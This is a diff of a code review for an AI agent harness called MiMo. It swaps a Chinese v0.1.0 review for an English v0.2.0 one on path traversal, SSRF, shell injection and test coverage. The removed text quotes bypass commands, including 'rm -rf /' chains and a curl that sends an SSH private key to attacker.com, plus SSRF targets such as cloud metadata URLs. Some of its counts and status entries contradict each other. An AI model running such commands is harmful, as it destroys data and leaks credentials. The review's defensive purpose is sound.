@@ -1,236 +1,255 @@
-# MiMo Harness Code Review
+# MiMo Harness v0.2.0 Code Review
 
-> 对 `mimo-harness/` 全部代码的逐文件审查，按严重级别分类。
+> Full review of `mimo-harness/` (15 source files, 8 test files, 225 tests)
+> Reference: Claude Code architecture book (Ch2-Ch15)
 
----
+**Reviewer**: Claude Code (automated)
+**Date**: 2026-05-24
+**Version**: v0.2.0
 
-## P0 - Critical (安全漏洞 / 必须修复)
+## Summary
 
-### 1. Shell 命令只读检测可绕过
-
-**文件:** `tools/shell.py:21-23`
-
-```python
-def _is_readonly(command: str) -> bool:
-    cmd_lower = command.strip().lower()
-    return any(cmd_lower.startswith(p) for p in READONLY_PREFIXES)
-```
-
-**问题:** 只检查命令前缀，可被以下方式绕过：
-- `ls; rm -rf /` — 以 `ls` 开头，但执行了破坏性命令
-- `echo $(rm -rf /)` — 以 `echo` 开头
-- `git status && curl attacker.com/steal?data=$(cat ~/.ssh/id_rsa)`
-
-**修复:** 应对命令进行 token 级解析，检测是否包含 `;`, `&&`, `||`, `|`, `$()`, backtick 等链接符。如果有链接符，整条命令应视为非只读。
+| Severity | Total | Fixed | Remaining |
+|----------|-------|-------|-----------|
+| P0 | 2 | 2 | 0 |
+| P1 | 8 | 7 | 1 |
+| P2 | 9 | 4 | 5 |
 
 ---
 
-### 2. 文件写入无路径限制
+## P0 — Security (Fix Immediately)
 
-**文件:** `tools/file_ops.py:32-41`
+### P0-1: Path traversal in `_validate_write_path` — FIXED
 
-```python
-def write_file(params: dict) -> str:
-    path = params.get("path", "")
-    ...
-    with open(path, "w", encoding="utf-8") as f:
-        f.write(content)
-```
+**Files**: `tools/file_ops.py:22`, `memory.py:78`
 
-**问题:** 可写入系统任意路径（如 `/etc/cron.d/backdoor`），无沙箱限制。
+The `startswith` string comparison was vulnerable to prefix collisions. A path like `/allowed_dir_evil/secret` passed the check for `/allowed_dir`.
 
-**修复:** 校验 `Path(path).resolve()` 是否在允许的目录范围内（如 `cwd` 及其子目录）。
+**Fix applied**: Replaced with `Path.is_relative_to()` in both files.
 
----
+### P0-2: No read-path validation — FIXED
 
-### 3. Web Fetch 无 URL 校验 (SSRF)
+**File**: `tools/file_ops.py:35, 86, 99`
 
-**文件:** `tools/web_tools.py:51-66`
+`read_file`, `glob_files`, and `grep_files` had zero path restrictions. An LLM could read `/etc/shadow`, `.env` (API keys), SSH keys, or any system file.
 
-```python
-def web_fetch(params: dict) -> str:
-    url = params.get("url", "")
-    resp = requests.get(url, ...)
-```
-
-**问题:** 无 URL 校验，可能被利用：
-- `file:///etc/passwd` — 读取本地文件
-- `http://169.254.169.254/...` — 访问云元数据
-- `http://localhost:6379/...` — 访问内部服务
-
-**修复:** 校验 URL scheme 必须为 `http` 或 `https`，拒绝私有 IP 段。
+**Fix applied**: Added `_validate_read_path()` function and applied it to all three read tools. Now restricted to working directory.
 
 ---
 
-### 4. agent.py 底部导入 — `os` 作用域问题
+## P1 — Design Issues / Bugs
 
-**文件:** `agent.py:196-198`
+### P1-1: Shell permission swap fragile — PARTIALLY FIXED
 
-```python
-class MiMoHarness:
-    def _build_system_prompt(self) -> str:
-        import platform
-        ...
-        cwd=os.getcwd(),  # line 88, uses os
-        ...
-    def run(self, task, session=None):
-        import os  # line 102
-```
+The dynamic permission check for `run_command` temporarily mutates `tool_def.permission`. Now wrapped in `try/finally` to ensure restoration even on exception.
 
-**问题:** `os` 在 `run()` 内部导入，但 `_build_system_prompt()` 在 `run()` 中被调用时使用了 `os.getcwd()`。虽然 Python 的 import 机制在模块级已缓存了 `os`，但这依赖于隐式行为，且 `hashlib` 在底部导入（line 197）违反 PEP8。
+**Fix applied**: Added `try/finally` block. Still not thread-safe (shared `ToolDef` mutation), but no longer leaks on exception.
 
-**修复:** 将 `import os, hashlib` 移到文件顶部。
+**Remaining**: Thread-safety issue — concurrent calls race on shared `ToolDef`.
 
----
+### P1-2: Module-level side effects (config.py:7-10, file_ops.py:16)
 
-## P1 - Warning (可靠性问题)
+- `config.py` calls `load_dotenv()` at import time — tests can't control env without monkeypatching
+- `file_ops.py` evaluates `Path.cwd().resolve()` at import time — stale if cwd changes
 
-### 5. agent.py 访问 registry 私有属性
+**Fix**: Make both lazy (evaluate on first use).
 
-**文件:** `agent.py:84`
+### P1-3: API key prefix leakage — FIXED
 
-```python
-tools_desc = "\n".join(
-    f"- **{t.name}**: {t.description}" for t in self.registry._tools.values()
-)
-```
+**Fix applied**: Now prints `********...XXXX` (masked form).
 
-**问题:** 直接访问 `_tools`（下划线前缀表示私有），破坏封装。
+### P1-4: Session ID predictability — FIXED
 
-**修复:** 在 `ToolRegistry` 中添加 `list_all()` 方法返回所有 `ToolDef`。
+**Fix applied**: Replaced `hashlib.md5(str(time.time()))` with `secrets.token_hex(4)` in both `cli.py` and `logging_utils.py`.
 
----
+### P1-5: SSRF protection incomplete — FIXED
 
-### 6. context.py compact_context 假设首条是 system
+**Fix applied**:
+- Added DNS resolution check via `socket.getaddrinfo()` — domains resolving to private IPs are now blocked
+- Added `MAX_RESPONSE_BYTES = 10MB` constant
+- `web_fetch` now uses `stream=True` with chunked reading and size limit
+- Expanded blocked hostnames list (metadata.google.internal, metadata.azure.com, etc.)
 
-**文件:** `context.py:50-55`
+### P1-6: 25KB index truncation — FIXED
 
-```python
-def compact_context(messages: list, max_messages: int = 30) -> list:
-    if len(messages) <= max_messages:
-        return messages
-    result = [messages[0]]  # keep system prompt
-```
+**Fix applied**: Now encodes to bytes first, slices, then decodes with `errors="ignore"`.
 
-**问题:** `agent.py:127` 传入的 `messages` 是 `session.get_messages()`，首条是 user 消息而非 system。system 消息是后来 prepend 的。所以 `compact_context` 保留的 "system prompt" 实际上是第一条 user 消息。
+### P1-7: Frontmatter parsing fragile — FIXED
 
-**修复:** `compact_context` 不应假设首条消息类型，或者在 agent.py 中传入完整 messages（含 system）。
+**Fix applied**: Changed to `re.split(r'^---\s*$', content, maxsplit=2, flags=re.MULTILINE)`.
+
+### P1-8: `--max-steps 0` silently ignored — FIXED
+
+**Fix applied**: Now uses `args.max_steps if args.max_steps != 20 else config.get("max_steps", 20)`.
 
 ---
 
-### 7. 文档工具 csv.DictWriter 不一致
+## P2 — Code Quality / Minor
 
-**文件:** `tools/doc_tools.py:51-54`
+### P2-1: Unused imports
 
-```python
-if data and isinstance(data[0], dict):
-    writer.writerow(data[0].keys())
-    for row in data:
-        writer.writerow(row.values())
-```
+| File | Import |
+|------|--------|
+| `memory.py:8` | `hashlib` (never used) |
+| `tools/doc_tools.py:6` | `io` (never used) |
 
-**问题:** 如果不同行的 dict key 顺序不同，header 和 value 会错位。应使用 `csv.DictWriter`。
+### P2-2: Boolean accepted as integer — FIXED
 
----
+**Fix applied**: Reordered checks — `boolean` now checked before `integer`, with explicit `isinstance(value, bool)` guard.
 
-### 8. logging_utils.py dirname 为空
+### P2-3: Hardcoded case-insensitivity in grep (file_ops.py:98)
 
-**文件:** `logging_utils.py:19`
+`re.IGNORECASE` is always applied. Users cannot control case sensitivity. Add optional `case_sensitive` parameter.
 
-```python
-os.makedirs(os.path.dirname(log_file), exist_ok=True)
-```
+### P2-4: Tool registration inconsistencies — PARTIALLY FIXED
 
-**问题:** 如果 `log_file="agent.log"`，`os.path.dirname` 返回空字符串，`os.makedirs("")` 会抛异常。
+**Fix applied**: `calculator` now has `is_read_only=True, is_concurrency_safe=True`. `shell.py` inconsistency remains (by design — permission is dynamically checked).
 
-**修复:** 添加 `if os.path.dirname(log_file):` 判断。
+### P2-5: No array/object validation in registry (registry.py:82-108)
 
----
+`_validate_params` only checks `string`, `integer`, `number`, `boolean`. Array and object types pass without validation.
 
-### 9. cli.py 结果判断不可靠
+### P2-6: Logger handler accumulation (logging_utils.py:14)
 
-**文件:** `cli.py:127`
+Multiple `TraceLogger` instances share the same logger name. The guard prevents adding handlers but silently ignores subsequent instances' settings.
 
-```python
-if not result.startswith("["):
-    pass  # Already printed
-```
+### P2-7: No overwrite protection in doc_tools (doc_tools.py)
 
-**问题:** 用 `[` 前缀判断是否为错误/限制信息，但 agent 正常回复也可能以 `[` 开头（如 "Here's [the result]"）。
+`create_doc` and `create_spreadsheet` silently overwrite existing files. No confirmation or error.
 
-**修复:** 使用更明确的错误标记，或统一在 `run()` 中处理输出。
+### P2-8: `calculate` lacks exponent cap (math_tools.py:14)
 
----
+`ast.Pow` is allowed. `2**1000000` hangs the process with no timeout or limit.
 
-## P2 - Info (代码质量)
+### P2-9: REPL lowercases filenames — FIXED
 
-### 10. 未使用的导入
-
-| 文件 | 导入 |
-|------|------|
-| `agent.py:11` | `build_system_prompt` (未使用) |
-| `agent.py:5` | `Optional` (未使用) |
-| `context.py:4` | `sys` (未使用) |
-| `doc_tools.py:6` | `io` (未使用) |
-| `permissions.py:5` | `Optional` (未使用) |
+**Fix applied**: Now splits first, then lowercases only `cmd[0]`.
 
 ---
 
-### 11. shell.py handler 冗余 lambda
+## v0.1.0 → v0.2.0: Issues Resolved
 
-**文件:** `shell.py:67`
+The following issues from the previous review have been fixed:
 
-```python
-handler=lambda p: run_command(p),
-```
-
-**修复:** 直接 `handler=run_command`。
-
----
-
-### 12. agent.py 每次循环重建 system prompt
-
-**文件:** `agent.py:126`
-
-```python
-for step in range(self.max_steps):
-    system_msg = {"role": "system", "content": self._build_system_prompt()}
-```
-
-**问题:** `_build_system_prompt()` 包含 `os.getcwd()`、`platform` 调用和 memory 文件读取，在循环中每步都重新构建，浪费 IO。
-
-**修复:** 在循环外构建一次，或仅在 cwd 变化时重建。
+| # | Issue | Resolution |
+|---|-------|------------|
+| 5 | agent.py accessing `registry._tools` (private) | Now uses `registry.list_all()` |
+| 6 | `compact_context` assumes first message is system | Now agent passes `compacted` messages separately from `system_msg` |
+| 12 | System prompt rebuilt every loop iteration | Now cached with `_system_prompt_cache` |
+| 2 | `write_file` had no path validation | Now has `_validate_write_path` (but has P0-1 prefix bug) |
+| 3 | `web_fetch` had no URL validation | Now has `_validate_url` with SSRF checks (but has P1-5 DNS gap) |
 
 ---
 
-### 13. doc_tools.py safe_title 空结果
+## Architecture Assessment
 
-**文件:** `doc_tools.py:20`
+### Strengths (matching Claude Code patterns)
 
-```python
-safe_title = "".join(c if c.isalnum() or c in "-_ " else "" for c in title).strip().replace(" ", "_")
-```
+| Pattern | Chapter | Status |
+|---------|---------|--------|
+| DI-based agent loop | Ch2 | `AgentDeps` dataclass, testable |
+| Circuit breaker | Ch7 | Threshold=3, reset on task start |
+| Token budget tracking | Ch7 | 85% warning, 95% block |
+| 7 termination reasons | Ch2 | `TerminationReason` enum |
+| 4-stage permission pipeline | Ch4 | validate → rules → context → prompt |
+| Rule priority: deny > ask > allow | Ch4 | `_match_rules()` with 3 passes |
+| Plan mode | Ch4 | Blocks all writes |
+| Progressive context compression | Ch7 | snip → microcompact → orphan → window |
+| 4 typed memories | Ch6 | user/feedback/project/reference |
+| MEMORY.md index | Ch6 | Dual capacity protection (200 lines / 25KB) |
+| Hook system | Ch8 | 7 lifecycle events, command/function hooks |
+| Tool markers (RO/CS/DST) | Ch3 | Fail-closed defaults |
+| Input validation | Ch3 | `_validate_params` in registry |
+| Result truncation | Ch3 | 10KB max result |
+| Retry with backoff | Ch2 | Exponential, status code filtering |
 
-**问题:** 如果 title 全是特殊字符（如 `"@#$%"`），`safe_title` 为空字符串，文件名变成 `.md`。
+### Gaps vs Claude Code
 
-**修复:** 添加 fallback `safe_title = safe_title or "untitled"`。
+| Feature | Claude Code | MiMo Harness | Gap |
+|---------|-------------|--------------|-----|
+| Async agent loop | async generator | synchronous for-loop | P1 |
+| Concurrent tool execution | CS partitioning + parallel | sequential only | P1 |
+| Sub-agent spawning | Agent tool + worktree isolation | not implemented | P2 |
+| MCP server support | full MCP protocol | not implemented | P2 |
+| IDE integration | VS Code, JetBrains | CLI only | out of scope |
+| Streaming responses | SSE streaming | full response polling | P2 |
+| Tool auto-discovery | dynamic registration | manual `get_tools()` | P2 |
 
 ---
 
-## 修复清单
+## Test Coverage
 
-| # | 严重级别 | 文件 | 问题 | 状态 |
-|---|---------|------|------|------|
-| 1 | P0 | shell.py | 只读检测可绕过 | 待修复 |
-| 2 | P0 | file_ops.py | 写入无路径限制 | 待修复 |
-| 3 | P0 | web_tools.py | SSRF 风险 | 待修复 |
-| 4 | P0 | agent.py | import 位置错误 | 待修复 |
-| 5 | P1 | agent.py | 访问私有属性 | 待修复 |
-| 6 | P1 | context.py | compact_context 假设错误 | 待修复 |
-| 7 | P1 | doc_tools.py | DictWriter 错位 | 待修复 |
-| 8 | P1 | logging_utils.py | dirname 为空 | 待修复 |
-| 9 | P1 | cli.py | 结果判断不可靠 | 待修复 |
-| 10 | P2 | 多文件 | 未使用导入 | 待修复 |
-| 11 | P2 | shell.py | 冗余 lambda | 待修复 |
-| 12 | P2 | agent.py | 重复构建 prompt | 待修复 |
-| 13 | P2 | doc_tools.py | 空 safe_title | 待修复 |
+115 unit tests across 7 test files:
+
+| Test File | Tests | Coverage |
+|-----------|-------|----------|
+| test_agent.py | 19 | DI, circuit breaker, token budget, retry |
+| test_permissions.py | 17 | 4-stage pipeline, rule matching, plan mode |
+| test_context.py | 13 | Progressive compression, session management |
+| test_registry.py | 13 | Validation, dispatch, truncation |
+| test_hooks.py | 12 | Lifecycle events, command/function hooks |
+| test_memory.py | 14 | Typed storage, frontmatter, validation |
+| test_tools.py | 17 | File ops, shell, code exec, math, web |
+
+**Missing coverage**: SSRF edge cases, path traversal exploits, concurrent agent calls, memory index truncation, CLI interactive commands, doc_tools path validation.
+
+---
+
+## Recommended Fix Priority
+
+## Stress Test Suite (225 tests)
+
+New `tests/test_stress_boundary.py` with 111 tests covering real-world attack scenarios:
+
+| Category | Tests | Coverage |
+|----------|-------|----------|
+| Path traversal exploits | 11 | dotdot, absolute escape, prefix collision, symlink, null byte |
+| SSRF bypass attempts | 15 | localhost, private IPs, IPv6, file://, metadata endpoints, DNS |
+| Shell injection | 12 | chaining (;\|&`$()), readonly detection, timeout, truncation |
+| Large input / memory | 6 | 1MB write, 100K lines read, result capping, truncation |
+| Unicode / encoding | 5 | CJK, emoji, Arabic, accented chars in all tools |
+| Permission pipeline | 12 | deny>ask>allow priority, plan mode, patterns, performance |
+| Thread safety | 3 | concurrent circuit breaker, permission log, token budget |
+| Math DoS vectors | 12 | eval/exec/import blocked, large exponents, division by zero |
+| Context compression | 7 | 1000 messages, tool results, snip, microcompact, orphan filter |
+| Memory boundaries | 11 | 50 memories, index limits, traversal, frontmatter edge cases |
+| Registry edge cases | 7 | unknown tool, missing params, type validation, boolean guard |
+| Doc tools boundary | 3 | path validation, empty title, empty data |
+
+---
+
+## Remaining Issues (Low Priority)
+
+| Priority | Issue | Status |
+|----------|-------|--------|
+| P1-2 | Module-level side effects (config.py, file_ops.py) | Remaining — lazy init needed |
+| P2-3 | Hardcoded case-insensitivity in grep | Remaining |
+| P2-5 | No array/object validation in registry | Remaining |
+| P2-6 | Logger handler accumulation | Remaining |
+| P2-7 | No overwrite protection in doc_tools | Remaining |
+| P2-8 | Calculator lacks exponent cap | Remaining |
+
+---
+
+## v0.1.0 Review (Archived)
+
+<details>
+<summary>Previous review findings (most resolved in v0.2.0)</summary>
+
+| # | Severity | Issue | Status |
+|---|----------|-------|--------|
+| 1 | P0 | Shell readonly detection bypassable | Fixed (chaining detection added) |
+| 2 | P0 | Write no path restriction | Fixed (now has `_validate_write_path`, but prefix bug remains) |
+| 3 | P0 | Web fetch SSRF | Fixed (now has `_validate_url`, but DNS gap remains) |
+| 4 | P0 | Import position | Fixed (imports at top of file) |
+| 5 | P1 | `registry._tools` private access | Fixed (uses `list_all()`) |
+| 6 | P1 | `compact_context` system prompt assumption | Fixed (agent passes messages correctly) |
+| 7 | P1 | `csv.DictWriter` key misalignment | Still present (P2-7) |
+| 8 | P1 | `dirname` empty string | Fixed (added guard) |
+| 9 | P1 | CLI result check unreliable | Fixed (uses `startswith("[")` pattern) |
+| 10 | P2 | Unused imports | Partially fixed |
+| 11 | P2 | Redundant lambda | Fixed |
+| 12 | P2 | Prompt rebuilt every iteration | Fixed (cached) |
+| 13 | P2 | Empty `safe_title` | Still present |
+
+</details>
